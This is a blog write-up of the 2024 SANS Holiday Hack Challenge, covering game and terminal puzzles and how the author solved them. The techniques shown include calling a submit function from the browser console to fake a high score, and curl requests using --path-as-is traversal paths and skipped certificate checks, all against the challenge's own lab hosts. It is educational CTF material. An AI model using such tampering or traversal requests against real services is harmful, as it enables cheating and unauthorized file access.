---
title: "SANs Holiday Hack Challenge 2024: Snow-maggeddon"
author: "Timothy Loftus (n3s0)"
date: 2025-10-25T00:38:40-06:00
lastmod: 2025-10-28
cover: shhc2024.jpg
summary: "Writeup from what I've completed for SANs Holiday Hack Challenge 2024: Snow-maggedon."
draft: false
---

> Note: This document is incomplete and will be updated periodically as I finish
> and explain more about the challenges as they're completed. 

# Overview

I've always enjoyed playing these. But, I never get around to playing them when
they're in progress. I wish I started this one sooner. But, there is no time
like the present.

This is my writeup for the SANs Holiday Hack Challenge that finished up in 2024.
SANs Holiday Hack Challenge is an annual; gamified, challenge provided by SANs
Institute and Counter Hack to educate all walks of life on information security.

If anyone would like a link to the 2024 challenge. I've provided a link below.

- [SANs Holiday Hack Challenge 2024: Snow-maggeddon](https://account.counterhack.com/?ref=hhc24)

With every challenge I'll provide the initial dialog from the elf next to it,
discuss the problem, and provide the solution or even some of the twists and
turns taken to come to a solution.

Hints rewarded for future challenges or hints that aid with the current
challenge will be provided under the header for the challenge.

> Since SANs 2025 Holiday Hack Challenge will be up and coming in a couple
> of months. I decided to work through SANs Holiday Hack Challenge 2024 to 
> see how far I get.

# SANs Introduction

Before logging in. SANs has a little introduction of what's available to us for
participating in the challange. Their introduction can be found below.

> Welcome to the 2024 SANS Holiday Hack Challenge: Snow-maggeddon!
> 
> Greetings, holiday travelers! Welcome to the 2024 SANS Holiday Hack Challenge.
> 
> As you explore Christmas Island and the North Pole, make sure you stop by the 
> elf Jingle Ringford along the way. He’ll give you your orientation and snowball 
> badge. Your snowball badge on the center of your avatar will be populated with 
> a series of objectives for the Holiday Hack Challenge. Just click on your badge 
> to see your objectives and more.
> 
> Also, please do keep an eye on your badge for updates on the narrative and 
> various happenings around Christmas Island and the North Pole during the event!
> 
> Here are some tips to get you exploring:
>
> - Bounce around the environment using the mouse or the arrow keys.
> - Enter doors by using the up arrow key.
> - Pick up items by stepping on them.
> - Join us on Discord!
> - Use the Settings button to adjust the volume of the music, sound effects, 
>   ambient noise, and elf dialog.
> - Use the menu at the top right to access your profile and edit your avatar, 
>   log out, or mute the music (who would ever want to do that?!?!).
> - Have fun!
> 
> — **The Counter Hack Crew and SANS Institute**

# Prologue

The prologue goes through a few Cranberry Pi terminals to get us warmed up to
the challenges. These challenges are located on ```Frosty's Beach```.

> Welcome back to the Geese Islands! Let's help the elves pack up to return to 
> the North Pole.
> 
> Talk to Jingle, Angel, and Poinsettia about their challenges.

## Holiday Hack Orientation (First Terminal)

> Welcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge!
>
> I'm Jingle Ringford, one of Santa's many elves.
>
> ...
> 
> Just kidding! It's actually the 2024 SANS Holiday Hack Challenge!
> 
> And although we're on Frosty's Beach on Christmas Island, we'll soon be on 
> our way back to the North Pole.
> 
> I thought it best to wait here for people that heard we're on the Geese 
> Islands but may not know we're leaving.
> 
> I haven't seen Santa since we started packing up, but he always asks me to 
> give a quick orientation to newcomers, so I'm continuing the tradition.
>
> Before you head out any further onto the island, you need to accomplish two 
> simple tasks.
>
> -- **Jingle Ringford (Frosty's Beach (Prologue))**

This challenge is simple. When you click on the terminal named "First Terminal"
it prompts you to type and answer in the answer prompt. Something of an
initiation into the Cranberry Pi challenges.

### Solution

Solution is to type the word ```answer``` into the answer prompt.

```txt
answer
```

Below is the response provided by Jingle Ringford once the challenge is
completed.

> You're a natural! Something new this year you may not know is that all challenges 
> have an easy and hard mode. There's also story mode, if you want to skip the 
> challenges and watch how our holiday season's adventure unfolds!
>
> Your snowball will reflect how you've solved the challenges with the bronze, 
> silver, and gold trophies.
>
> Well, that's it, now you're orientated! Feel free to get yourself settled in, 
> establish a cohort with others, or just explore this lovely island. Just be 
> careful where you walk as we are moving around some pretty heavy crates.
>
> Oh, while we're preparing everything to set sail for the North Pole, I heard 
> Poinsettia McMittens and Angel Candysalt could use some assistance. I'm sure 
> they'll appreciate any help you can provide!
>
> We'll let you know when the boat leaves, but for now relax, enjoy the sun, and 
> most importantly, have FUN!
>
> -- **Jingle Ringford (Frosty's Beach (Prologue))**

## Elf Connect

There are two phases of this terminal. One is beating the Elf Connect game and
the other is finding a way to beat the high score. Which is almost impossible to
do. Almost.

> Welcome back, island adventurer! I'm Angel Candysalt — so happy to finally meet 
> you!
> 
> I'm thrilled you're here because I could really use a hand with something.
> 
> Have you ever heard of a game called Connections?
> 
> It’s simple! All you need to do is find groups of four related words.
> 
> I've been stuck on it all day, and I'm sure someone as sharp as you will breeze 
> through it.
> 
> Oh, and while you're at it, check out randomElf's score — they hit fifty 
> thousand points, which seems… oddly suspicious.
> 
> Think they might have tampered with the game? Just a hunch!
>
> -- **Angel Candysalt (Frosty's Beach (Prologue))**

Below is the initial screen for the **Elf Connect** game. From the looks of it.
There is a High Score of 50,000. Which doesn't quite add up given that each
round adds up to 400 points (100 points for each set) for 4 rounds. Which is
about 1,600 points for each round.

Going to recircle back to that math at some point. But, my case here is a high
score of 50,000 points is impossible.

{{< image src="elf-connect/elf_connect.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}

This is a category matching game named Elf Connect and Angel Candysalt is
suspicious about `randomElf` and their high score in Elf Connect.

Something that I found while I was browsing the code was a link to the Elf
Connect game. It was useful to have this without the small Cranberry Pi terminal
screen.

- [Elf Connect (hh24-elfconnect)](https://hhc24-elfconnect.holidayhackchallenge.com/)

With all that being said. Time to get started with this challenge.

### Solution (Silver)

Provided is one of the hints related to this challenge. Stating this is similar
to the New York Times Connections game. Which I personally have never played.
But, it provides a good introduction for the game. 

**Hints:**

> Elf Connect Easy
>
> From: Angel Candysalt
>
> Terminal: Elf Connect
>
> I love brain games! This one is like the New York Times Connections game. Your 
> goal here is to find groups of items that share something in common. Think of 
> each group as having a hidden connection or theme—four items belong together, 
> and there are multiple groups to find! See if you can spot patterns or common 
> threads to make connections. Group all the items correctly to win!

I completed the game initially by matchng the correct cards to their respective
categories. This provides a "silver" acheivemnt when the challenge has been
completed

There is actually a better approach to this. There is a `<script>` element that
contains client-side JavaScript for the game.

Initially I attempted to change the value for the updated score to see if I
could beat the high score. But, that did not work. It just added 100 points. So
that's out.

Below is the non-working update. Originally it was 100. Either due to my own
flawed log or inexperience with JavaScript. I even tried to do this in the
WebDev console. But, that didn't work either.

```js
score += 50000;
```

But, if you were to look at the word sets. It provides them for the four levels
in an array.

```js
const wordSets = {
    1: ["Tinsel", "Sleigh", "Belafonte", "Bag", "Comet", "Garland", "Jingle Bells", "Mittens", "Vixen", "Gifts", "Star", "Crosby", "White Christmas", "Prancer", "Lights", "Blitzen"],
    2: ["Nmap", "burp", "Frida", "OWASP Zap", "Metasploit", "netcat", "Cycript", "Nikto", "Cobalt Strike", "wfuzz", "Wireshark", "AppMon", "apktool", "HAVOC", "Nessus", "Empire"],
    3: ["AES", "WEP", "Symmetric", "WPA2", "Caesar", "RSA", "Asymmetric", "TKIP", "One-time Pad", "LEAP", "Blowfish", "hash", "hybrid", "Ottendorf", "3DES", "Scytale"],
    4: ["IGMP", "TLS", "Ethernet", "SSL", "HTTP", "IPX", "PPP", "IPSec", "FTP", "SSH", "IP", "IEEE 802.11", "ARP", "SMTP", "ICMP", "DNS"]
};
```

There is a nested array of indexes for each set in a round. This array; named
`correctSets` provides the correct set for each round. So, you can cross
reference this to the `wordSets` and figure out the correct answers for each
round.

```js
let correctSets = [
    [0, 5, 10, 14], // Set 1
    [1, 3, 7, 9],   // Set 2
    [2, 6, 11, 12], // Set 3
    [4, 8, 13, 15]  // Set 4
];
```

When you connect the dots for each set in each round it looks like you get the
answers for each round. You just need to look in the `<script>` element within
the page source. 

- **Round 1:** 
    - 0: Tinsel, 5: Garland, 10: Star, and 14: Lights
    - 1: Sleigh, 3: Bag, 7: Mittens, and 9: Gifts
    - 2: Belafonte, 6: Jingle Bells, 11: Crosby, and 12: White Christmas
    - 4: Comet, 8: Vixen, 13: Prancer, and 15: Blitzen
- **Round 2:** 
    - 0: Nmap, 5: netcat, 10: Wireshark, and 14: Nessus
    - 1: burp, 3: OWASP Zap, 7: nikto, and 9: wfuzz
    - 2: Frida, 6: Cycript, 11: AppMon, and 12: apktool
    - 4: Metasploit, 8: Cobalt Strike, 13: HAVOC, and 15: Empire
- **Round 3:** 
    - 0: AES, 5: RSA, 10: Blowfish, and 14: 3DES
    - 1: WEP, 3: WPA2, 7: TKIP, and 9: LEAP
    - 2: Symmetric, 6: Asymmetric, 11: hash, and 12: hybrid
    - 4: Caesar, 8: One-time Pad, 13: Ottendorf, and 15: Scytale
- **Round 4:** 
    - 0: IGMP, 5: IPX, 10: IP, and 14: ICMP
    - 1: TLS, 3: SSL, 7: IPSec, and 9: SSH
    - 2: Ethernet, 6: PPP, 11: IEEE 802.11, and 12: ARP
    - 4: HTTP, 8: FTP, 13: SMTP, and 15: DNS

I played the game using the lists above and completed the game with no issue.
Apart from selecting something in the wrong category by mistake.

### Solution (Gold)

After finishing the Elf Connect game. Angel Candysalt provides this dialog. I
wasn't so sure as to what it was hinting at.

> If you want a more difficult challenge, try beating randomElf's score.
> 
> -- **Angel Candysalt (Frosty's Beach (Prologue))**

There is also a hint provided by Angel Candysalt related to the Gold/Hard part
of the Elf Connect challenge. It's hinting that we should look at the HTML and
client-side JavaScript for the Elf Connect game using our browser's developer
tools console.

**Hints:**

> Elf Connect Hard
>
> From: Angel Candysalt
>
> Terminal: Elf Connect
>
> WOW! A high score of 50,000 points! That’s way beyond the limit! With only 
> four rounds and a max of 400 points per round, the top possible score should 
> be 1,600 points. So, how did someone get to 50,000? Something unusual must be 
> happening!
> 
> If you're curious, you might want to check under the hood. Try opening the 
> browser's developer tools console and looking around—there might even be a 
> variable named 'score' that could give you some insights. Sometimes, games 
> hold secrets for those who dig a little deeper. Give it a shot and see what 
> you can discover!

Started by looking through the code and it looks like there is a
```submitAction``` function that sends a post request to the URL to submit the
answer. Although I'm not seeing anything major here because I'm not very
familiar with JavaScript. Knowing what this function does could possibly help me
in the future.

```js
async function submitAction(answer) {
    //const urlParams = new URLSearchParams(window.location.search);
    //const id = urlParams.get('id');
    //localStorage.setItem('id', id);
    let id = localStorage.getItem('id');
    if (!id) {
        alert('No ID found in localstorage so we could not submit your results');
    }
    const url = `/submit?id=${id}`;
    const data = { answer: answer }; // Send the answer as a JSON object

    //Original
    //const url = '/submit';
    //const data = { answer: answer };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (response.ok) {
            const result = await response.json();
            console.log('Success:', result);
            return true;
        } else {
            console.error('Error:', response.statusText);
        }
    } catch (error) {
        console.error('Error:', error);
    }
}
```

In the function ```gameStatus``` it will run this function with a 1 and output 
"Success! You have defeated the Elf Connect!!!". So this must be what we see if 
we comlete all four rounds when the status of the game is checked.

```js
function gameStatus() {
    //console.log(roundComplete);
    if (roundComplete < 4) {
        emitter.explode(20);
        displaySuccessMessage('Round ' + roundComplete + ' Completed', function () {
            this.sessionStorage.setItem('score', score);
            this.sessionStorage.setItem('roundComplete', roundComplete);
            window.location.href = `${window.location.origin}${window.location.pathname}?round=${roundComplete + 1}`;
        });
    } else {
        emitter.explode(20);
        submitAction(1);
        displaySuccessMessage.call(this, 'Success! You have defeated the Elf Connect!!!!');
    }

}
```

There is another function named checkSelectedSet that checks that the current
set is correct. Basically, if it's correct. It checks the score. If the score is
greater then the highest score; which is 50,000, it runs ```submitAction``` with
a 2 and it displays a success message stating "Elf Connect Complete and
Hacked!".

```js
function checkSelectedSet(scene) {
    let selectedIndices = selectedBoxes.map(box => box.index);
    selectedIndices.sort((a, b) => a - b);

    let isCorrectSet = false;
    let matchedSetIndex = -1;

    for (let i = 0; i < correctSets.length; i++) {
        if (JSON.stringify(selectedIndices) === JSON.stringify(correctSets[i])) {
            isCorrectSet = true;
            matchedSetIndex = i;
            break;
        }
    }

    if (isCorrectSet) {
        completedSets.push(matchedSetIndex);
        positionCompletedSets();
        disableCompletedSet(matchedSetIndex); // Disable interaction on the completed set
        shuffleRemainingRows();

        // Update score by 100 points
        score += 100;
        scoreText.setText('Score: ' + score);

        // Add high-score board
        if (score > 50000) {
            highScoreText.setText('High Score: ' + score);
            emitter.explode(20);
            submitAction(2);
            displaySuccessMessage('Great Job Hacker! Elf Connect Complete and Hacked!', function () {

            });
        }

        // If all sets are completed, trigger the fireworks effect
        if (completedSets.length === 4) {
            roundComplete++;
            scene.sound.play('horaay');
            gameStatus();
        } else {
            scene.sound.play('ding');
        }
    } else {
        selectedBoxes.forEach(box => {
            //box.setStyle({ backgroundColor: '#0a7e28' }); // card color unselected original
            box.setStyle({ backgroundColor: '#10ca40' }); // card color unselected
            box.selected = false;
        });
        scene.sound.play('bzzzt');
    }

    selectedBoxes = [];
}
```

Decided to see if this would work in the the developers console. So I opened it
up and ran the ```submitAction``` function in the developer console.

```js
submitAction(2)
```

Once that was ran. The gold acheivement was given and Angel Candysalt provided
the following response.

> Amazing! You really connected all the dots like a pro.
>
> -- **Angel Candysalt (Frosty's Beach (Prologue))**

## The Goose of Christmas Island

This part of Frosty's Beach where there is just a random cobra chicken provided
the comedic relief I needed.

> HONK! HONK!
>
> -- **Goose of Christmas Island (Frosty's Beach (Prologue))**

## Elf Minder 9000

{{< image src="elf-minder-9000/elfminder9000.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}

This game took me a while to complete. 

> Center your mind, and become one with the island!
>
> Relax...
>
> This isn't working! I'm trying to play this game but the whole "moving back 
> to the North Pole" thing completely threw me off.
>
> Say, how about you give it a try. It's really simple. All you need to do is 
> help the elf get to the exit.
>
> The faster you get there, the better your score!
>
> I've run into some weirdness with the springs though. If I had created this 
> game it would've been a lot more stable, but I won't comment on that any 
> further.
>
> -- **Poinsettia McMittens (Frosty's Beach (Prologue))**

### Solution (Silver)

{{< image src="elf-minder-9000/sandystart01.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/wavesandcrates02.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/tidaltreasures03.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/dunedash04.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/coralcove05.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/shellseekers06.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/palmgroveshuffle07.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/tropicaltangle08.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/cratecaper09.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/shorelineshuffle10.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/beachbounty11.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}
{{< image src="elf-minder-9000/driftwooddunes12.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}

### Solution (Gold)

I haven't completed this challenge yet. Need to obtain more images of what is
completed yet. So, stay tuned for more content on this.

After solving the `Silver` challenges the story was updated.

> With challenges solved, we're ready to head to the North Pole! Let's hope 
> Santa is back already to direct operations.

```html
<div class="admin-controls hidden">
    <!-- <button id="startBtn">Start</button> -->
    <button id="resetBtn">Reset</button>
    <button id="clearPathBtn">Clear Path</button>
    <button id="clearEntitiesBtn">Clear Entities</button>
    <fieldset id="tools">
        <legend>Select a tool:</legend>

        <input type="radio" id="path" name="tool-select" value="path" checked />
        <label for="path">Path</label>

        <input type="radio" id="eraser" name="tool-select" value="eraser" />
        <label for="eraser">Eraser</label>

        <input type="radio" id="portal" name="tool-select" value="portal" />
        <label for="portal">Tunnel</label>

        <input type="radio" id="start" name="tool-select" value="start" />
        <label for="start">Start</label>

        <input type="radio" id="end" name="tool-select" value="end" />
        <label for="end">End</label>

        <input type="radio" id="crate" name="tool-select" value="crate" />
        <label for="crate">Crate</label>

        <input type="radio" id="blocker" name="tool-select" value="blocker" />
        <label for="blocker">Blocker</label>

        <input type="radio" id="hazard" name="tool-select" value="hazard" />
        <label for="hazard">Hazard</label>

        <input type="radio" id="steam" name="tool-select" value="steam" />
        <label for="steam">Steam</label>

        <input type="radio" id="spring" name="tool-select" value="spring" />
        <label for="spring">Spring</label>
    </fieldset>
</div>
```

```js
if (this.isPointInAnySegment(nextPoint) || entityHere) {
    if (entityHere) return this.segments[0][0]; // fix this
    return nextPoint;
} else {
    return;
}    
```

{{< image src="elf-minder-9000/arealpickle13.png" alt="Elf connect initial screen" position="center"  style="border-radius: 8px;" >}}

# Act I

Off to Act I. Where we need to help a few more elves solve some challenges.
Sounds like there is some tension in the North Pole because Santa is out.

> With Santa away, Wombley Cube and Alabaster Snowball have each tried to lead. 
> Surely they won't mess up the naughty and nice list...
> 
> Help Bow, Morcel, and Jewell solve their challenges.

It seems like there is some foreshadowing related to Wombley Cube and Alabaster
Snowball potentially messing up the naughty and nice list.

## cURLing

> Well hello there! I'm Bow Ninecandle, bright as a twinkling star! Everyone's 
> busy unpacking, but I've grown quite bored of that. Care to join me for a 
> lovely game?
>
> Oh Joy! Today, We're diving into something delightful: the curling 
> challenge—without any ice, but plenty of sparkle!
>
> No icy brooms here though! We're all about Curl, sending web requests from the 
> command line like magic messages.
>
> So, have you ever wielded Curl before? If not, no worries at all, my friend!
>
> It's this clever little tool that lets you whisper directly to web servers. 
> Pretty neat, right?
>
> Think of it like sending secret scrolls through the interwebs, awaiting a wise 
> reply!
> 
> To begin, you can type something like curl https://example.com. Voilà! The HTML 
> of the page appears, like conjuring a spell!
>
> Simple enough, huh? But oh, there's a whole world of magic you can cast with 
> Curl!
> 
> We're just brushing the surface here, but trust me—it’s a hoot and a half!
>
> If you get tangled up or need help, just give me a shout! I’m here to help you 
> ace this curling spectacle.
>
> So, are you ready to curl those web requests like a pro? Let’s see your magic 
> unfold!
>
> -- **Bow Ninecandle (Front Yard (Act I))**

Provided are the hints provided by Bow Ninecandle related to the cURLing
challenge.

This one discusses taking a look at the `--path-as-is`[^1] option in curl(1).
Reading the curl(1) manual and it says it tells curl(1) not to handle `/../` or
`/./` in the URL path.

Sounds like foreshadowing to me.

**Hints:**

> cURL: Don't squash
>
> From: Bow Ninecandle
>
> Terminal: cURLing
> 
> Take a look at cURL's "--path-as-is" option; it controls a default behavior 
> that you may not expect!

This one provides a link to the curl(1) manual page. Which I was probably going
to dive into for this anyway. So I definately appreciated this.

> cURL Manual
>
> From: Bow Ninecandle
>
> Terminal: cURLing
>
> The official [cURL man page](https://curl.se/docs/manpage.html) has tons of 
> useful information on how to use cURL.

### Solution (Silver)

This challenge starts off with a brief intro noting that you're going to run
through basic curl commands in a name called `Curling Fun`.

```sh
Welcome to Curling Fun!  We will learn some basic curl commands while playing a round of curling.
```

Time to say `yes` to the prompt and get started.

```sh
Are you ready to begin? [y]es: 
```

1. Unlike the defined standards of a curling sheet, embedded devices often have 
   web servers on non-standard ports.  Use curl to retrieve the web page on host 
   "curlingfun" port 8080. If you need help, run the 'hint' command.

First question is asking how to access web servers on a non-standard port. In
this case we're accessing `curlingfun` on port `8080`.

To do this. Issue the curl command to send the request to `curlingfun` and
use the port; indicated by a colon (`:`) as shown in the command below.

```sh
curl "curlingfun:8080"
```

Looks like that's correct. We're off to a good start.

```sh
You have successfully accessed the site on port 8080!

If you need help, please remember to run "hint" for a hint!
```
 
2. Embedded devices often use self-signed certificates, where your browser will 
   not trust the certificate presented.  Use curl to retrieve the TLS-protected 
   web page at https://curlingfun:9090/

Second question we're diving into how to deal with self-signed/insecure
certificates using curl. It's requesting that we use the URL
`https://curlingfun:9090/` for this HTTP request.

You can send your request using curl regularly to see what it will do. An error
from curl is expected from this.

```sh
curl https://curlingfun:9090
```

The curl command will provide this error saying it failed because a self-signed
or untrusted certificate is being used. Now that I'm done testing that. I will
do this with the expected command.

```sh
curl: (60) SSL certificate problem: self-signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

To let curl know that you know the site is using an insecure or self-signed
certificate. You can use either the `--insecure` or `-k` flag to let it know
that it's OK to ignore the insecure certificate. Both will ignore the
insecure/self-signed certificate and connect anyway.

The man pages for commands are usually good places to start if you're unsure of
a functionality for a specific command.

This is an example of how to do that with the `--insecure` flag.

```sh
curl --insecure https://curlingfun:9090
```

This is an example of how to do that with `-k`. 

```sh
curl -k https://curlingfun:9090
```

When this is ran. You'll see a success message stating the certificate warning
has been bypassed. The message will also say we'll need to use `--insecure` and
`-k` for the duration of the challenge.

```sh
You have successfully bypassed the self-signed certificate warning!
Subsequent requests will continue to require "--insecure", or "-k" for short.

If you need help, please remember to run "hint" for a hint!
```

3. Working with APIs and embedded devices often requires making HTTP POST requests. 
   Use curl to send a request to https://curlingfun:9090/ with the parameter "skip" 
   set to the value "alabaster", declaring Alabaster as the team captain.

In question 3 we go into working with APIs and the use of parameters with
requests. Specifically how to send one. In this question they are asking us to
send a `POST` request to `https://curlingfun:9090` with the `skip` (skipper)
parameter set to the value `alabaster`.

To achieve this I sent a post request with the `-d` (data) flag; longform being
`--data`. This will send a post request with the `skip=alabaster` parameter.

```sh
curl -X POST -d "skip=alabaster" -k https://curlingfun:9090/
```

Once this is done. The game will indicate that the POST request was sent
succesfully.

```sh
You have successfully made a POST request!
```

4. Working with APIs and embedded devices often requires maintaining session 
   state by passing a cookie.  Use curl to send a request to 
   https://curlingfun:9090/ with a cookie called "end" with the value "3", 
   indicating we're on the third end of the curling match.

This question discusses sending a cookie to `https://curlingfun:9090/` named
`end` with the value of `3`. This is intended to indicate that we're on the
third end of the curing match.

With that being said. I used the `-b` (cookie) flag; long form being `--cookie`
to the `curlingfun` URL.

```sh
curl -b "end=3" -k https://curlingfun:9090/
```

After sending this we get the following output stating we have successfully set
a cookie.

```sh
You have successfully set a cookie!
```

5. Working with APIs and embedded devices sometimes requires working with raw 
   HTTP headers. Use curl to view the HTTP headers returned by a request to 
   https://curlingfun:9090/

The objective for question 5 is to send a request that will output the raw HTTP
headers to `https://curlingfun:9090`.

To accomplish this I used the `-v` or verbose flag; `--verbose`. Although this
is unecessary tend to use it to trace the flow of http requests.

```sh
curl -v -k https://curlingfun:9090
```

Below is the data it spit out. There are some TLS headers grouped with some
regular HTTP headers. I have removed some of the output to prevent information
overload for this section of the challenge.

```sh
> GET / HTTP/1.1
> Host: curlingfun:9090
> User-Agent: curl/7.81.0
> Accept: */*
> 
* TLSv1.2 (IN), TLS header, Supplemental data (23):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.2 (IN), TLS header, Supplemental data (23):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
* TLSv1.2 (IN), TLS header, Supplemental data (23):
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Mon, 27 Oct 2025 05:37:27 GMT
< Content-Type: text/plain;charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Custom-Header: You have found the custom header!
< 
```

Before we move on. Another way to do this is to use the `-I` flag; `--head`, to
fetch the headers from `curlingfun`.

```sh
curl -k -I https://curlingfun:9090
```

This will provide a refined output without the stuff from the `-v` flag. Like
shown below. Can see there is a header by the name of `Custom-Header` in this
one also.

```sh
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 27 Oct 2025 05:49:36 GMT
Content-Type: text/plain;charset=UTF-8
Connection: keep-alive
Custom-Header: You have found the custom header!
```

6. Working with APIs and embedded devices sometimes requires working with custom 
   HTTP headers. Use curl to send a request to https://curlingfun:9090/ with an 
   HTTP header called "Stone" and the value "Granite".

This one discusses working with APIs again. Question 6 has an objective to send
a custom HTTP header using curl to `https://curlingfun:9090/` with the header
named `Stone` and the value `Granite`.

To do this I used the header or `-H` paramether; longform `--header`, to set the
header. This command sends a post request with the custom header `Sone: Granite`
to the curlingfun URL.

```sh
curl -X POST -H "Stone: Granite" -k https://curlingfun:9090/
```

Looks like that was successful. We have set our custom header in the POST
request.

```sh
You have successfully set a custom HTTP header!
```

7. curl will modify your URL unless you tell it not to.  For example, use curl 
   to retrieve the ollowing URL containing special characters: 
   https://curlingfun:9090/../../etc/hacks

In question 7 our objective is to send a `GET` request to `curlingfun` with the
path `/../../etc/hacks`. We need to find the option that doesn't mess with these
special charaters too.

To complete this challenge. I sent a `GET` request with the `--path-as-is` flag
to make sure curl doesn't do anything to `/../`. This was provided from one of
the hints.

```sh
curl -k -X GET --path-as-is "https://curlingfun:9090/../../etc/hacks"
```

Looks like that was a success. 

```sh
You have successfully utilized --path-as-is to send a raw path!
```

Sweet! Another achievement for completing this challenge!

```sh
Great work! 
 
Once HHC grants your achievement, you may close this terminal.
```

Bow Ninecandle provides some feedback on our progress.

> Bravo! Look at you, curling through that like a true web wizard!
>
> You zipped through that challenge faster than a curling stone on enchanted ice!
> 
> -- **Bow Ninecandle (Front Yard (Act I))**

### Solution (Gold)

So three commands for the gold star? Sounds like a party to me. There isn't much
else provided for this. But, I'm sure the hints will come in handy.

> You know... rumor has it you can breeze through this with just three commands. 
> Why don’t you give it a whirl?
>
> -- **Bow Ninecandle (Front Yard (Act I))**

Decided to start off with listing the contents of the directory.

```sh
ls
```

Looks like there is a `HARD-MODE.txt` file in here so I assume that's the
file.

```sh
HARD-MODE.txt  HELP
```

Looking at the contents of the file using the `cat(1)` command shows the
following output.

The instructions are to send a post request to `https://curlingfun:9090/` with
the paramethers `skip=bow`, a cookie set as `end=10`, and a header set as `Hack:
12ft`. Sounds simple enough.

```sh
Prefer to skip ahead without guidance?  Use curl to craft a request meeting these requirements:

- HTTP POST request to https://curlingfun:9090/
- Parameter "skip" set to "bow"
- Cookie "end" set to "10"
- Header "Hack" set to "12ft"
```

Used the following command to send a POST request with the following data.

```sh
curl -X POST -k -d "skip=bow" --cookie "end=10" -H "Hack: 12ft" https://curlingfun:9090
```

Looks like that worked. Now for the next command which requires we send a get
request to the URL `https://curlingfun:9090/../../etc/button`.

```sh
Excellent!  Now, use curl to access this URL: https://curlingfun:9090/../../etc/button
```

For this command I needed to use the `--path-as-is` flag so I could use `/../`
in the URL. This will prevent the curl(1) command from correcting the URL to
make it safer.

```sh
curl -k --path-as-is "https://curlingfun:9090/../../etc/button"
```

Looks like that worked too. So the last command is to allow redirects while
going to the `https://curlingfun:9090/GoodSportsmanship` URL.

```sh
Great!  Finally, use curl to access the page that this URL redirects to: https://curlingfun:9090/GoodSportsmanship
```

Used to `-L` flag to follow the redirects to the URL.

```sh
curl -k -L https://curlingfun:9090/GoodSportsmanship
```

Which worked. The promt indicated that I can close the terminal once HHC grants
the gold achievement. 

```sh
Excellent work, you have solved hard mode!  You may close this terminal once HHC grants your achievement.
```

Some noew dialog from Bow Ninecandle related to completing the hard part of the
challenge.

> Wait... did you just slice and dice it all into three commands? My stars, 
> you're a Curling conjurer!
>
> -- **Bow Ninecandle (Front Yard (Act I))**

## Frosty Keypad

{{< image src="frosty-keypad/frosty-keypad-location.png" alt="Image of the Frosty Keypad in the North Pole." position="center" style="border-radius: 8px;" >}}

> Hello again! I'm Morcel Nougat, dashing around like a reindeer on a sugar 
> rush! We've got a bit of a dilemma, and I could really use your expertise.
>
> Wombley and Alabaster have taken charge now that Santa’s gone missing, and 
> We're scrambling to get the Wish List secured. But... one of the elves in the 
> Data Management Team got overzealous, and the Shredder McShreddin 9000 
> gobbled up a crucial document we need to access Santa's chest!
> 
> It’s our golden ticket to getting Santa’s Little Helper tool working properly. 
> Without it, the hardware hack we're planning is as empty as Santa’s sleigh in 
> January.
> 
> Think you can help? I can get you into the Shredder McShreddin 9000’s inner 
> workings to retrieve the pieces, but there are two access codes involved. One 
> of the elves left a hint, but it’s all a blur to me!
> 
> I've noticed that some elves keep referring to a certain book when they walk 
> by. I bet it has the answers we need to crack the code and recover the 
> document!
> 
> You know, some of the elves always have their noses in the same book when 
> they pass by here. Maybe it’s got the clues we need to crack the code?
> 
> -- **Morcel Nougat (Front Yard (Act I))**

When you look through dev tools you can see the URL. I've provided the Frosty
Keypad game below so it's easier to sift through.

- [Frosty Keypad](https://hhc24-frostykeypad.holidayhackchallenge.com/?&challenge=termFrostyKeypad)


**Hints:**

> Shine Some Light on It
> 
> From: Morcel Nougat
> 
> Terminal: Frosty Keypad
>
> Well this is puzzling. I wonder if Santa has a seperate code. Bet that would 
> cast some light on the problem. I know this is a stretch...but...what if you 
> had one of those fancy UV lights to look at the fingerprints on the keypad? 
> That might at least limit the possible digits being used...

> Just Some Light Reading
> 
> From: Morcel Nougat
> 
> Terminal: Frosty Keypad
>
> See if you can find a copy of that book everyone seems to be reading these 
> days. I thought I saw somebody drop one close by...

> Who Are You Calling a Dorf?
> 
> From: Morcel Nougat
> 
> Terminal: Frosty Keypad
> 
> Hmmmm. I know I have seen Santa and the other elves use this keypad. I wonder 
> what it contains. I bet whatever is in there is a National Treasure!

You find the `Frosty Book` somewhere around the crates and then later the
flash light on the other side. Once the flashlight is found it's part of your
inventory/items and can be used while the `Frosty Keypad` is pulled up.

- [The Frosty Book](https://frost-y-book.com/)

List of inventory items; that will help with the silver and gold  challenges,
are shown in the image below. The `Frosty Book` and the `UV Flashlight` are both
found amounst the crates. If you sit behind them the become transparent and you
can pick them up.

